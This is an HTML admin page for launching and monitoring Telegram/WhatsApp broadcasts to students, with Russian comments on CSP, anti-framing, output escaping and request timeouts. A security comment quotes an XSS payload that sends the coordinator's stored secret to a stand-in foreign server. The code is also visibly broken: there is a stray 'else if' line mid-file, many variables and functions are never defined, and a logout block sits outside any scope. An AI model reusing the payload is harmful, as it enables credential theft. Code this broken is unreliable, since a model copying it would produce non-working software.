<head>
<meta charset="utf-8" />
<!-- Волна 5 (аудит 14.10.2026, B-72, SEC-9): CSP мета-тегом (GitHub Pages заголовков не ставит), до любого скрипта.
     Запросы — только к сайту и бэкенду Apps Script: внедрённый скрипт не унесёт пароль координатора на чужой сервер
     (ни fetch, ни картинка); вкладки кабинета — свои страницы (frame-src 'self'). 'unsafe-inline' — на страницах
     встроенные скрипты и обработчики в разметке; хеши для обработчиков требуют 'unsafe-hashes' (не во всех браузерах). -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://script.google.com https://script.googleusercontent.com; frame-src 'self'; object-src 'none'; base-uri 'self'; form-action 'none'" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="robots" content="noindex,nofollow" />
<script>
/* ЗАЩИТА ОТ ВСТРАИВАНИЯ В ЧУЖОЙ САЙТ (06.10.2026). GitHub Pages не умеет
   отдавать заголовок X-Frame-Options, поэтому любую страницу координатора мог
   показать у себя в рамке посторонний сайт и подставлять под курсор её кнопки.
   Страница работает только сама по себе либо в рамке нашего же кабинета
   (admin-panel.html — тот же сайт). В чужой рамке прячем всё и пробуем
   открыть страницу вместо чужого сайта. */
(function () {
  var свой = false;
  try { свой = window.top === window.self || window.top.location.origin === window.location.origin; } catch (e) { свой = false; }
  if (свой) return;
  document.documentElement.style.display = "none";
  try { window.top.location = window.self.location.href; } catch (e) { /* рамка с sandbox — остаёмся спрятанными */ }
})();
</script>

<script type="module">
/**
 * ЭКРАНИРОВАНИЕ ВЫВОДА (02.09.2026).
 *
 * Всё, что приходит с бэкенда, вставлялось в страницу через innerHTML как есть.
 * Часть этих данных вводит не координатор и не amoCRM, а сам студент: имя
 * участника берётся из его профиля в Telegram (ensureParticipantRow_ в Api.gs).
 *
 * Чем это грозило. Человек ставит себе в Telegram имя вида
 *   <img src=x onerror="fetch('https://чужой-сервер/?s='+localStorage.wtusa_admin_secret)">
 * и один раз открывает Mini App — ссылка на бота публична, белого списка нет.
 * Как только координатор откроет эту страницу, код выполнится в его браузере и
 * утащит пароль администратора. А с этим паролем можно рассылать произвольные
 * сообщения на любые номера с рабочего WhatsApp-канала компании и привязывать
 * свой Telegram к чужим сделкам.
 *
 * esc() превращает пять символов, значимых для HTML, в безопасные сущности.
 * Применять на КАЖДОЙ подстановке чужих данных внутри innerHTML, включая
 * значения атрибутов (кавычки закрываются тем же способом).
 */
function esc(value) {
  return String(value === null || value === undefined ? "" : value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

/**
 * СООБЩЕНИЯ НА СТРАНИЦЕ ВМЕСТО alert (12.10.2026).
 *
 * Что ломалось. Итог фоновых действий (ответ сервера после отправки, сбой
 * отметки, сбой загрузки) показывался окном alert: оно останавливает страницу,
 * пока его не закроют, а в кабинете (страница во фрейме) всплывало поверх
 * соседней вкладки. Пока окно висело, остальные ответы ждали — по одной
 * неудачной отметке посещаемости приходилось закрывать по окну на строку.
 *
 * Теперь — плашка вверху страницы: не мешает работать, остаётся, пока её не
 * закроют (✕); успешные сообщения исчезают сами через 10 секунд. Окна
 * confirm остались только прямо перед отправкой сообщений студентам.
 */
function сообщение(текст, вид) {
  const box = document.getElementById("toasts");
  if (!box) return;
  const el = document.createElement("div");
  el.className = "toast" + (вид ? " " + вид : "");
  el.setAttribute("role", вид === "err" ? "alert" : "status");
  const t = document.createElement("div");
  t.textContent = текст;
  const x = document.createElement("button");
  x.type = "button";
  x.className = "toast-x";
  x.title = "Закрыть";
  x.textContent = "✕";
  x.addEventListener("click", () => el.remove());
  el.append(t, x);
  box.appendChild(el);
  while (box.children.length > 4) box.firstElementChild.remove();
  if (вид === "ok") setTimeout(() => el.remove(), 10000);
}

import { BACKEND_URL } from "./js/services/config.js";
import { STAGES } from "./js/config/roadmap.config.js";

/**
 * ГДЕ ЛЕЖИТ ПАРОЛЬ (02.09.2026).
 *
 * Был localStorage — хранилище без срока жизни: пароль оставался в браузере
 * навсегда, кнопки «Выйти» не было ни на одной странице, и на общем офисном
 * компьютере любой, кто открывал адрес, сразу оказывался внутри. Удалить
 * сохранённый пароль можно было только через инструменты разработчика.
 *
 * Стало sessionStorage — то же самое, но привязанное ко вкладке: закрыли
 * вкладку, и пароль исчез. В пределах рабочего сеанса ничего не меняется,
 * перезаходить не нужно. Плюс появилась кнопка «Выйти».
 *
 * С 12.10.2026 (P17) пароль уходит в теле POST-запроса, а не в адресе — в
 * журнал выполнений Apps Script и историю браузера он больше не попадает.
 */
const SECRET_KEY = "wtusa_admin_secret";
const gateEl = document.getElementById("gate");
const mainEl = document.getElementById("main");



// Хранилище браузера запрещено — код живёт в памяти страницы до перезагрузки (12.10.2026).
let секретВПамяти = "";
function secret() {
  // 05.10.2026: если в Chrome для сайта запрещены cookie и данные сайтов,
  // само обращение к sessionStorage бросает исключение — страница молча
  // переставала работать («Войти» ничего не делала).
  try {
    return sessionStorage.getItem(SECRET_KEY) || секретВПамяти;
  } catch (e) {
    return секретВПамяти;
  }
}

// ТАЙМ-АУТ ЗАГРУЗКИ (12.10.2026). Что ломалось: «холодный» сервер Google или
// зависшее соединение держали страницу на «Загрузка…» бесконечно, без единого
// слова. Теперь чтение списка обрывается через 45 секунд, и на странице
// появляется ошибка с кнопкой «Повторить».
const ТАЙМАУТ_ЗАГРУЗКИ_МС = 45000;

async function adminGet(action, extraParams, timeoutMs) {
  // P17 (12.10.2026): пароль — в теле POST, а не в адресе (адрес оседает в истории
    // браузера и журнале Google). Чтение тоже идёт POST-ом; сервер отвечает тем же.
    const params = new URLSearchParams({ action });
  const ctrl = timeoutMs && typeof AbortController === "function" ? new AbortController() : null;
  const timer = ctrl ? setTimeout(() => ctrl.abort(), timeoutMs) : null;
  try {
    const resp = await fetch(`${BACKEND_URL}?${params.toString()}`, {
      method: "POST",
      headers: { "Content-Type": "text/plain;charset=utf-8" },
      body: JSON.stringify(Object.assign({}, extraParams || {}, { secret: secret() })),
      signal: ctrl ? ctrl.signal : undefined,
    });
    const json = await resp.json();
    if (json.error) throw new Error(json.error);
    return json;
  } catch (err) {
    if (ctrl && ctrl.signal.aborted) throw new Error("TIMEOUT");
    throw err;
  } finally {
    if (timer) clearTimeout(timer);
  }
}

/**
 * ПОНЯТНЫЙ ТЕКСТ ОШИБКИ (05.10.2026). Координатор видел сырой технический
 * текст: «bad secret», «Failed to fetch», «Unexpected token '<', "<!DOCTYPE "...
 * is not valid JSON» (так выглядит страница ошибки Google вместо ответа).
 */
function понятнаяОшибка(err) {
  const m = String((err && err.message) || err || "");
  if (/bad secret/i.test(m)) return "неверный секретный код";
  if (m === "TIMEOUT") return "сервер не ответил за 45 секунд";
  if (m === "WRITE_TIMEOUT") return "сервер не ответил за 60 секунд — запись могла дойти до сервера, проверьте результат перед повтором"; // Волна 5, B-47
  if (/Failed to fetch|NetworkError|Load failed/i.test(m)) return "нет связи с сервером";
  if (/Unexpected token|not valid JSON|Unexpected end of/i.test(m)) return "сервер ответил не по формату (временный сбой на стороне Google)";
  if (/^unknown action/i.test(m)) return "сервер не распознал запрос (" + m + ")";
  return m || "попробуйте ещё раз";
}


// Волна 5 (аудит 14.10.2026, B-47): ЗАПИСЬ ТОЖЕ НЕ ЖДЁТ БЕСКОНЕЧНО. Что ломалось: при зависшем
// соединении «Сохраняем…/Отправляю…» висело без конца, кнопка оставалась выключенной. Теперь через
// 60 с ожидание обрывается (WRITE_TIMEOUT). Запись при этом МОГЛА дойти до сервера, поэтому текст
// ошибки просит проверить результат перед повтором, а места, где повтор опасен (рассылка, WhatsApp,
// приглашения), считают это «результат неизвестен»: повтор — с тем же номером запроса.
const ТАЙМАУТ_ЗАПИСИ_МС = 60000;
async function adminPost(action, payload) {
  const params = new URLSearchParams({ action }); // P17: пароль — в теле
  const ctrl = typeof AbortController === "function" ? new AbortController() : null;
  const timer = ctrl ? setTimeout(() => ctrl.abort(), ТАЙМАУТ_ЗАПИСИ_МС) : null;
  try {
    const resp = await fetch(`${BACKEND_URL}?${params.toString()}`, {
      method: "POST",
      headers: { "Content-Type": "text/plain;charset=utf-8" },
      body: JSON.stringify(Object.assign({}, payload || {}, { secret: secret() })),
      signal: ctrl ? ctrl.signal : undefined,
    });
    const json = await resp.json();
    if (json.error) throw new Error(json.error);
    return json;
  } catch (err) {
    if (ctrl && ctrl.signal.aborted) throw new Error("WRITE_TIMEOUT");
    throw err;
  } finally {
    if (timer) clearTimeout(timer);
  }
}

  } else if (type === "stage") {

/**
 * P12-аудит (12.10.2026): ЗАПУСК БЕЗ ОТВЕТА СЕРВЕРА.
 * Что ломалось: если сервер рассылку создал, а ответ до страницы не дошёл
 * (обрыв связи, страница ошибки Google вместо ответа), координатор видел
 * «Не запущено», кнопка сразу включалась, а повтор уходил с новым requestId —
 * от второй рассылки спасала только серверная проверка «тот же текст за 10 минут».
 * Что теперь: один requestId на (сегмент, канал, текст), пока не придёт точный
 * ответ сервера — повтор сервер узнает и второй рассылки не создаст. При сбое
 * связи/формата — «результат неизвестен — проверьте историю», история
 * перечитывается, «Запустить» выключена на минуту.
 */
let запускИдёт = false;
let ждатьПослеНеизвестного = false;
let запускБезОтвета = null; // { ключ, rid } — запуск, на который не пришёл точный ответ

function ответаНет(err) {
  // Волна 5 (B-47): WRITE_TIMEOUT — ответа не дождались за 60 с, рассылка могла создаться.
  return /Failed to fetch|NetworkError|Load failed|Unexpected token|not valid JSON|Unexpected end of|^unknown action|^WRITE_TIMEOUT$/i.test(String((err && err.message) || err || ""));
}

function текстЧасов(inHours) {
  return inHours ? "Сейчас рабочее время — рассылки идут." : "Сейчас не рабочее время: рассылки продолжатся в 9:00 по Алматы.";
}

async function запустить() {
  if (запускИдёт || ждатьПослеНеизвестного || !предпросмотр || ключПредпросмотра !== текущийКлюч()) return;
  const n = предпросмотр.count;
  if (!window.confirm(`Отправить сообщение ${n} студентам (Telegram ${предпросмотр.tg}, WhatsApp ${предпросмотр.wa})?\n\nОтменить потом можно кнопкой «Остановить» — то, что уже ушло, не вернуть.`)) return;
  запускИдёт = true;
  $("bc-launch").disabled = true;
  const ключ = текущийКлюч();
  const requestId = запускБезОтвета && запускБезОтвета.ключ === ключ
    ? запускБезОтвета.rid
    : "bc" + Date.now().toString(36) + Math.random().toString(36).slice(2, 8);
  запускБезОтвета = { ключ, rid: requestId };
  try {
    const r = await adminPost("adminBroadcastCreate", { segment: сегмент(), channel: канал(), text: $("bc-text").value, title: $("bc-title").value, confirmCount: n, requestId });
    запускБезОтвета = null;
    if (r.duplicate) сообщение("Такая рассылка уже создана — второй раз не запускаю.", "warn");
    else сообщение(`Рассылка запущена: ${r.count} получателей.${r.inHours ? "" : " Сейчас не рабочее время — отправка начнётся в 9:00 по Алматы."}`, "ok");
    if (r.warning) сообщение(r.warning, "warn");
    if (typeof r.inHours === "boolean") $("bc-hours").textContent = текстЧасов(r.inHours);
    предпросмотр = null;
    ключПредпросмотра = "";
    рисоватьПредпросмотр(null);
    загрузитьСписок(); // сама показывает «Обновляю историю…»; старый ответ новый уже не перезапишет
  } catch (err) {
    if (ответаНет(err)) {
      ждатьПослеНеизвестного = true;
      setTimeout(() => { ждатьПослеНеизвестного = false; обновитьКнопкуЗапуска(); }, 60000);
      сообщение("Сервер не подтвердил запуск (" + понятнаяОшибка(err) + "): результат неизвестен — проверьте историю ниже. Если рассылки там нет, через минуту нажмите «Запустить» ещё раз: повтор пойдёт с тем же номером запроса, второй рассылки сервер не создаст.", "err");
      загрузитьСписок();
    } else {
      запускБезОтвета = null; // точный отказ сервера: ничего не создано
      сообщение("Не запущено: " + понятнаяОшибка(err), "err");
    }
  } finally {
    запускИдёт = false;
    обновитьКнопкуЗапуска();
  }
}

function прогресс(c) {
  const done = c.sent + c.failed + c.skipped + c.unknown;
  const pct = c.total ? Math.round((done / c.total) * 100) : 0;
  return `<div class="bar"><div style="width:${pct}%"></div></div>
    <div class="sub">Отправлено ${c.sent} (Telegram ${c.tg}, WhatsApp ${c.wa}) · в очереди ${c.queued} · не доставлено ${c.failed}${c.unknown ? " · под вопросом " + c.unknown : ""} · пропущено ${c.skipped} · всего ${c.total}</div>`;
}

/**
 * P12-аудит (12.10.2026): ИСТОРИЯ РАССЫЛОК.
 * Что ломалось:
 *  • после «Запустить» (тост «Рассылка запущена») история ещё секунды
 *    показывала «Рассылок ещё не было» и старую строку о рабочем времени —
 *    без всякого «загрузка»; а если медленный ответ первой загрузки страницы
 *    приходил позже свежего, он затирал новую рассылку пустым списком и
 *    заодно останавливал опрос раз в 30 с;
 *  • один неудачный опрос стирал список (с кнопками «Пауза»/«Остановить») и
 *    опрос больше не возобновлялся;
 *  • открытое «Подробно» закрывалось при каждом опросе; двойной щелчок по
 *    «Подробно» во время загрузки закрывал таблицу, а ответ открывал её снова.
 * Что теперь: у каждой загрузки свой номер — применяется только самый свежий
 * ответ; пока идёт загрузка — «Обновляю историю…»; при сбое прежний список
 * остаётся, ошибка — строкой над ним, опрос продолжается; открытые «Подробно»
 * переживают опрос и обновляются; пока «Подробно» грузится, щелчки по нему не
 * считаются.
 */
let номерСписка = 0;
let естьИдущие = false; // в последнем удачном ответе была рассылка «идёт»
const открытыеПодробно = new Set();
const грузятсяПодробно = new Set();
const кешПодробно = new Map();
// Волна 5 (аудит 14.10.2026, B-40, API-12): опрос раз в N секунд перечитывал КАЖДОЕ раскрытое «Подробно», даже у
// завершённых рассылок, где ничего не меняется. Теперь заново — только у идущих и у тех, чей статус сменился с
// прошлой загрузки (например, только что завершилась); остальные показываются из кеша.
const статусПодробно = new Map(); // id → статус рассылки при последней загрузке «Подробно»
const статусыСписка = new Map(); // id → статус из последнего списка

function состояниеСписка(текст, ошибка) {
  const el = $("bc-list-state");
  el.className = "sub" + (ошибка ? " err" : "");
  el.textContent = текст || "";
}

// ОПРОС ТОЛЬКО ПОКА ВИДНО (волна 4, 14.10.2026). Раньше вкладка опрашивала сервер раз в 30 с,
// пока идёт рассылка, — даже скрытая (другая вкладка кабинета, свёрнутое окно) и всю ночь, когда
// рассылка всё равно спит до 9:00: до ~1 400 лишних запросов за ночь. Теперь: страница не видна —
// опрос стоит (вернулись — список перечитывается сразу); ночью — раз в 5 минут. Триггер рассылки
// при этом чинит и ежечасная проверка на сервере (bcSelfHeal_), так что скрытая вкладка ему не нужна.
let последнийInHours = true;
function страницаВидна() {
  if (document.hidden) return false;
  try { const f = window.frameElement; if (f && f.offsetParent === null) return false; } catch (e) { /* другой источник — считаем видимой */ }
  return true;
}
function запланироватьОпрос() {
  clearTimeout(таймерСписка);
  if (!естьИдущие || !страницаВидна()) return;
  таймерСписка = setTimeout(() => { if (страницаВидна()) загрузитьСписок().catch(() => {}); }, последнийInHours ? 30000 : 300000);
}
document.addEventListener("visibilitychange", () => { if (страницаВидна() && естьИдущие) загрузитьСписок().catch(() => {}); });

function ящикПодробно(id) {
  const item = [...document.querySelectorAll("#bc-list .bc-item")].find((x) => x.dataset.id === id);
  return item ? item.querySelector(".bc-detail") : null;
}

async function загрузитьСписок(готовыйЗапрос) {
  const мой = ++номерСписка;
  const box = $("bc-list");
  clearTimeout(таймерСписка);
  $("bc-refresh").disabled = true;
  состояниеСписка("Обновляю историю…");
  if (!box.querySelector(".bc-item")) box.innerHTML = `<div class="sub">Загрузка…</div>`;
  try {
    const r = await (готовыйЗапрос || adminGet("adminBroadcastList", null, ТАЙМАУТ_ЗАГРУЗКИ_МС));
    if (мой !== номерСписка) return null; // пока ждали, ушёл более свежий запрос
    $("bc-hours").textContent = текстЧасов(r.inHours);
    последнийInHours = r.inHours !== false;
    состояниеСписка("");
    const list = r.broadcasts || [];
    естьИдущие = list.some((b) => b.status === "running");
    статусыСписка.clear();
    list.forEach((b) => статусыСписка.set(b.id, b.status));
    [...открытыеПодробно].forEach((id) => { if (!list.some((b) => b.id === id)) { открытыеПодробно.delete(id); кешПодробно.delete(id); } });
    if (!list.length) { box.innerHTML = `<div class="sub">Рассылок ещё не было.</div>`; запланироватьОпрос(); return list; }
    box.innerHTML = list.map((b) => `
      <div class="bc-item" data-id="${esc(b.id)}">
        <div class="bc-head"><b>${esc(b.title)}</b><span class="st st-${esc(b.status)}">${esc(СТАТУС[b.status] || b.status)}</span></div>
        <div class="sub">${b.createdAt ? new Date(b.createdAt).toLocaleString("ru-RU", { day: "numeric", month: "short", hour: "2-digit", minute: "2-digit" }) : ""} · ${esc(b.channel === "tg" ? "только Telegram" : b.channel === "wa" ? "только WhatsApp" : "авто")}</div>
        ${прогресс(b.counts)}
        <div class="bc-actions">
          ${b.status === "running" ? `<button class="btn secondary small-btn" data-cmd="pause">Пауза</button>` : ""}
          ${b.status === "paused" ? `<button class="btn secondary small-btn" data-cmd="resume">Продолжить</button>` : ""}
          ${b.status === "running" || b.status === "paused" ? `<button class="btn secondary small-btn danger" data-cmd="stop">Остановить</button>` : ""}
          <button class="btn secondary small-btn" data-cmd="detail">Подробно</button>
        </div>
        <div class="bc-detail"></div>
      </div>`).join("");
    box.querySelectorAll(".bc-item").forEach((item) => {
      item.querySelectorAll("[data-cmd]").forEach((btn) => btn.addEventListener("click", () => команда(item.dataset.id, btn.dataset.cmd, item, btn)));
    });
    открытыеПодробно.forEach((id) => {
      const d = ящикПодробно(id);
      if (!d) return;
      d.innerHTML = кешПодробно.get(id) || `<div class="sub">Загрузка…</div>`;
      const статус = статусыСписка.get(id);
      const перечитать = !кешПодробно.has(id) || статус === "running" || статусПодробно.get(id) !== статус; // B-40
      if (перечитать && !грузятсяПодробно.has(id)) { статусПодробно.set(id, статус); загрузитьПодробно(id); }
    });
    запланироватьОпрос();
    return list;
  } catch (err) {
    if (мой !== номерСписка) return null;
    if (box.querySelector(".bc-item")) {
      состояниеСписка("Не удалось обновить историю: " + понятнаяОшибка(err) + ". Показан прежний список — нажмите «Обновить».", true);
    } else {
      состояниеСписка("");
      box.innerHTML = `<div class="sub err">Не удалось загрузить историю: ${esc(понятнаяОшибка(err))}</div>`;
    }
    запланироватьОпрос();
    return [];
  } finally {
    if (мой === номерСписка) $("bc-refresh").disabled = false;
  }
}

async function загрузитьПодробно(id) {
  грузятсяПодробно.add(id);
  try {
    const r = await adminGet("adminBroadcastDetail", { id }, ТАЙМАУТ_ЗАГРУЗКИ_МС);
    const html = `<table class="users"><thead><tr><th>Кому</th><th>Канал</th><th>Статус</th><th>Причина</th></tr></thead><tbody>${(r.rows || []).map((q) => `
        <tr><td>${esc(q.name)}<div class="muted">сделка ${esc(q.dealId)}</div></td><td>${q.channel === "tg" ? "Telegram" : "WhatsApp"}</td><td>${esc(СТАТУС_СТРОКИ[q.status] || q.status)}${q.sentAt ? `<div class="muted">${new Date(q.sentAt).toLocaleTimeString("ru-RU", { hour: "2-digit", minute: "2-digit" })}</div>` : ""}</td><td class="muted">${esc(q.error)}</td></tr>`).join("")}</tbody></table>`;
    if (!открытыеПодробно.has(id)) return;
    кешПодробно.set(id, html);
    const d = ящикПодробно(id);
    if (d) d.innerHTML = html;
  } catch (err) {
    if (!открытыеПодробно.has(id)) return;
    const d = ящикПодробно(id);
    if (d && !кешПодробно.has(id)) d.innerHTML = `<div class="sub err">${esc(понятнаяОшибка(err))}</div>`;
  } finally {
    грузятсяПодробно.delete(id);
  }
}

async function команда(id, cmd, item, btn) {
  if (cmd === "detail") {
    if (грузятсяПодробно.has(id)) return; // ещё грузится — второй щелчок не считаем
    const box = item.querySelector(".bc-detail");
    if (открытыеПодробно.has(id)) {
      открытыеПодробно.delete(id);
      кешПодробно.delete(id);
      box.innerHTML = "";
      return;
    }
    открытыеПодробно.add(id);
    статусПодробно.set(id, статусыСписка.get(id)); // B-40
    box.innerHTML = `<div class="sub">Загрузка…</div>`;
    await загрузитьПодробно(id);
    return;
  }
  if (cmd === "stop" && !window.confirm("Остановить рассылку? Оставшиеся в очереди не получат сообщение. Продолжить её потом будет нельзя.")) return;
  btn.disabled = true;
  try {
    await adminPost("adminBroadcastControl", { id, command: cmd });
    сообщение(cmd === "pause" ? "Рассылка на паузе." : cmd === "resume" ? "Рассылка продолжается." : "Рассылка остановлена.", "ok");
    await загрузитьСписок();
  } catch (err) {
    сообщение("Не получилось: " + понятнаяОшибка(err), "err");
    btn.disabled = false;
    if (ответаНет(err)) загрузитьСписок(); // Волна 5 (B-47): команда могла дойти — история покажет, что с рассылкой
  }
}

function вставитьПодстановку(ph) {
  const ta = $("bc-text");
  const a = ta.selectionStart ?? ta.value.length, b = ta.selectionEnd ?? ta.value.length;
  ta.value = ta.value.slice(0, a) + ph + ta.value.slice(b);
  ta.focus();
  ta.selectionStart = ta.selectionEnd = a + ph.length;
  обновитьКнопкуЗапуска();
}

function подготовитьФорму() {
  const tpl = $("bc-template");
  tpl.innerHTML = `<option value="">— без шаблона —</option>` + ШАБЛОНЫ.map((t) => `<option value="${t.id}">${esc(t.title)}</option>`).join("");
  tpl.addEventListener("change", () => {
    const t = ШАБЛОНЫ.find((x) => x.id === tpl.value);
    if (!t) return;
    if ($("bc-text").value.trim() && !window.confirm("Заменить текст шаблоном?")) { tpl.value = ""; return; }
    $("bc-text").value = t.text;
    if (!$("bc-title").value.trim()) $("bc-title").value = t.title;
    $("bc-seg").value = t.segment;
    рисоватьПараметры();
  });
  $("bc-ph").innerHTML = ПОДСТАНОВКИ.map((p) => `<button type="button" class="chip" data-ph="${esc(p)}">${esc(p)}</button>`).join("");
  $("bc-ph").querySelectorAll("[data-ph]").forEach((b) => b.addEventListener("click", () => вставитьПодстановку(b.dataset.ph)));
  $("bc-seg").addEventListener("change", рисоватьПараметры);
  document.querySelectorAll('input[name="bc-ch"]').forEach((r) => r.addEventListener("change", обновитьКнопкуЗапуска));
  $("bc-text").addEventListener("input", обновитьКнопкуЗапуска);
  $("bc-preview").addEventListener("click", сделатьПредпросмотр);
  $("bc-test-tg").addEventListener("click", () => тестСебе("tg"));
  $("bc-test-wa").addEventListener("click", () => тестСебе("wa"));
  $("bc-test-wa").disabled = !(опции && опции.testWhatsApp);
  $("bc-test-wa").title = опции && опции.testWhatsApp ? "" : "Нужна Script Property ADMIN_WHATSAPP_PHONE";
  $("bc-launch").addEventListener("click", запустить);
  $("bc-refresh").addEventListener("click", () => загрузитьСписок());
  // P12-аудит (12.10.2026): в кабинете вкладка «Рассылки» показывала историю
  // с момента первого открытия — рассылка, запущенная в другой вкладке, не
  // появлялась до «Обновить». Теперь кабинет при каждом показе вкладки шлёт
  // событие panel-show, и история перечитывается. Отдельно страница работает как раньше.
  window.addEventListener("panel-show", () => загрузитьСписок());
  // Переход из «Студентов» с готовым сегментом: admin-broadcasts.html?segment=cannot_write
  const preset = new URLSearchParams(location.search).get("segment");
  if (preset && [...$("bc-seg").options].some((o) => o.value === preset)) {
    $("bc-seg").value = preset;
    const t = ШАБЛОНЫ.find((x) => x.segment === preset);
    if (t) { tpl.value = t.id; $("bc-text").value = t.text; $("bc-title").value = t.title; }
  }
  рисоватьПараметры();
}

let entering = false; // guards against a double-click/double-Enter firing tryEnter() twice
let mainLoaded = false; // guards against loadMain() ever running (and re-binding listeners) twice

/**
 * ОДНА ЗАГРУЗКА ВМЕСТО ДВУХ И НИКАКОГО ЛОЖНОГО ВХОДА (12.10.2026).
 *
 * Что ломалось. При сохранённом коде страница сама начинала загрузку, но всё
 * это время (на холодном сервере Google — до минуты) на экране оставалась форма
 * входа. Координатор думал, что его «выкинуло», вводил код ещё раз — и уходил
 * второй такой же запрос; флаг mainLoaded ставился только в конце, поэтому оба
 * доходили до привязки обработчиков. Сбой загрузки показывался блокирующим
 * окном alert, а зависшая загрузка не кончалась никогда.
 *
 * Теперь: одна общая загрузка (повторный вызов получает тот же промис); пока
 * она идёт, вместо формы входа — «Загрузка…»; через 45 секунд — ошибка на
 * странице и кнопка «Повторить». Неверный код возвращает к форме входа с
 * пояснением под ней. Обработчики привязываются один раз — после первой
 * успешной загрузки.
 */
let загрузка = null;

function показатьЭкран(какой) {
  gateEl.style.display = какой === "gate" ? "" : "none";
  document.getElementById("boot").style.display = какой === "boot" ? "" : "none";
  mainEl.style.display = какой === "main" ? "block" : "none";
}

function показатьЗагрузку() {
  показатьЭкран("boot");
  const t = document.getElementById("boot-text");
  t.className = "sub";
  t.textContent = "Загрузка… На холодном сервере это может занять до минуты.";
  document.getElementById("boot-retry").style.display = "none";
}

function показатьСбойЗагрузки(текст) {
  показатьЭкран("boot");
  const t = document.getElementById("boot-text");
  t.className = "sub err";
  t.textContent = текст;
  document.getElementById("boot-retry").style.display = "";
}

function показатьВход(ошибка) {
  показатьЭкран("gate");
  document.getElementById("gate-err").textContent = ошибка || "";
}

async function init() {
  const gateSubmit = document.getElementById("gate-submit");
  const secretInput = document.getElementById("secret-input");

  async function tryEnter() {
    if (entering || загрузка) return;
    const value = secretInput.value.trim();
    if (!value) return;
    entering = true;
    gateSubmit.disabled = true;
    try {
      try {
        sessionStorage.setItem(SECRET_KEY, value);
      } catch (e) {
        // 12.10.2026: вместо окна alert — плашка, а код держим в памяти страницы:
        // работать можно, просто после обновления код придётся ввести снова.
        секретВПамяти = value;
        сообщение("Браузер не даёт сохранить код входа: в настройках Chrome для этого сайта запрещены cookie и данные сайтов. Страница работает, но после обновления код придётся ввести снова.", "warn");
      }
      document.getElementById("gate-err").textContent = "";
      await loadMain();
    } finally {
      entering = false;
      gateSubmit.disabled = false;
    }
  }
  gateSubmit.addEventListener("click", tryEnter);
  secretInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") tryEnter();
  });
  document.getElementById("boot-retry").addEventListener("click", () => loadMain());

  if (secret()) {
    await loadMain();
  } else {
    показатьЭкран("gate");
  }
}

function loadMain() {
  if (mainLoaded) {
    показатьЭкран("main");
    return Promise.resolve();
  }
  if (!загрузка) загрузка = первичнаяЗагрузка().finally(() => { загрузка = null; });
  return загрузка;
}

async function первичнаяЗагрузка() {
  показатьЗагрузку();
  // Ускорение (14.10.2026): историю рассылок запрашиваем сразу, параллельно с настройками формы —
  // раньше второй запрос ждал первый (~3 с лишних на каждое открытие вкладки).
  const историяЗаранее = adminGet("adminBroadcastList", null, ТАЙМАУТ_ЗАГРУЗКИ_МС);
  историяЗаранее.catch(() => {}); // ошибку покажет загрузитьСписок; здесь — только чтобы не было «необработанного отказа»
  try {
    опции = await adminGet("adminBroadcastOptions", null, ТАЙМАУТ_ЗАГРУЗКИ_МС);
  } catch (err) {
    // КОД СТИРАЕМ ТОЛЬКО ЕСЛИ ОН НЕВЕРНЫЙ (05.10.2026). Раньше любой сбой первой
    // загрузки (нет связи, страница ошибки Google) выглядел как «Не удалось
    // войти» и стирал код. В кабинете (admin-panel.html) код общий для трёх
    // вкладок: сбой в одной разлогинивал остальные — там следующее действие
    // отвечало «bad secret».
    const неверныйКод = /bad secret/i.test(String((err && err.message) || ""));
    if (неверныйКод) {
      try { sessionStorage.removeItem(SECRET_KEY); } catch (e) {}
      секретВПамяти = "";
      // Внутри кабинета возвращаем к общему экрану входа, а не к своему;
      // причину кабинет покажет под своей формой входа.
      if (window.parent !== window) {
        try { sessionStorage.setItem("wtusa_admin_gate_msg", "Неверный секретный код — введите его ещё раз."); } catch (e) {}
        try { window.parent.location.reload(); } catch (e) {}
      }
      показатьВход("Неверный секретный код — введите его ещё раз.");
    } else {
      показатьСбойЗагрузки("Не удалось загрузить данные: " + понятнаяОшибка(err) + ". Код входа сохранён — нажмите «Повторить».");
    }
    return;
  }

  mainLoaded = true;
  показатьЭкран("main");

  подготовитьФорму();
  загрузитьСписок(историяЗаранее);
}

init();

  // Выход: стираем пароль и возвращаем страницу к экрану входа. Перезагрузка —
  // самый честный способ сбросить всё загруженное состояние (списки участников,
  // сделок, результаты), чтобы после выхода на экране не осталось чужих данных.
  const logoutBtn = document.getElementById("logout-btn");
  if (logoutBtn) {
    // ВНУТРИ КАБИНЕТА ВЫХОД — ОБЩИЙ (05.10.2026). Страница во фрейме
    // admin-panel.html перезагружала только себя: соседние вкладки оставались
    // открытыми со списками студентов, а на экране было две кнопки «Выйти».
    const вКабинете = window.parent !== window;
    if (вКабинете) logoutBtn.style.display = "none";
    logoutBtn.addEventListener("click", () => {
      try { sessionStorage.removeItem(SECRET_KEY); } catch (e) {}
      try { (вКабинете ? window.parent : window).location.reload(); } catch (e) { location.reload(); }
    });
  }
</script>
</body>
</html>
